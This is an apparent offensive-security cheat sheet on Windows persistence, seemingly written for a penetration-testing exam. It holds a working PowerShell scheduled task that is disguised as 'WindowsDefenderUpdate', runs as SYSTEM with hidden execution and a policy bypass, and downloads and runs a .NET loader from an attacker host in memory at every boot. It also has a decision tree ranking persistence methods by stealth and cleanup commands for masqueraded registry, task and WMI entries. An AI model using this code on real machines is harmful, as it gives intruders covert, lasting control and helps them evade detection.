# Windows Persistence

Methods for maintaining access across reboots, logoffs, and cleanup attempts.

---

## Quick decision

```
What access level do I have?
│
├── Standard user (no admin)?
│   ├── Registry Run Key (HKCU)  — easiest, survives reboot
│   ├── Scheduled task AtLogOn   — survives reboot, cleaner than run key
│   └── Startup folder (CurrentUser) — just drop a .vbs file
│
└── Admin?
    ├── Scheduled task as SYSTEM → in-memory payload (hardest to detect)
    ├── WMI subscription         → hardest to find/remove, no file
    └── Service installation     → professional, survives crashes
```

---

## Files

| File | Contents |
|------|---------|
| `persistence.ps1` | All persistence methods with full PowerShell implementation |

---

## In-memory payload via scheduled task (key technique)

The most evasive method: a scheduled task downloads and loads a .NET assembly into memory on every startup. No binary on disk, no obvious file.

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument `
    '-w hidden -exec bypass -NoProfile -c "& {$b=(New-Object Net.WebClient).DownloadData(''http://KALI/loader.exe'');[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))}"'
$trigger   = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -Principal $principal -Force
```

This runs at every boot as SYSTEM, loads your .NET loader into memory, executes it. The loader handles everything else (shellcode execution, C2 connection).

---

## Trigger types

```powershell
-AtLogOn                          # User login
-AtStartup                        # System boot
-RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)  # Every 5 min
-Daily -At "23:00"                # Daily at 11pm
```

---

## Cleanup (exam clean-up procedure)

```powershell
# Remove everything you added:
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "WindowsDefenderUpdate" -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item "$([System.Environment]::GetFolderPath('Startup'))\WindowsUpdate.vbs" -ErrorAction SilentlyContinue

# WMI cleanup:
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*SecurityHealth*"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -eq "SecurityHealthFilter" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -eq "SecurityHealthConsumer" | Remove-WmiObject
```
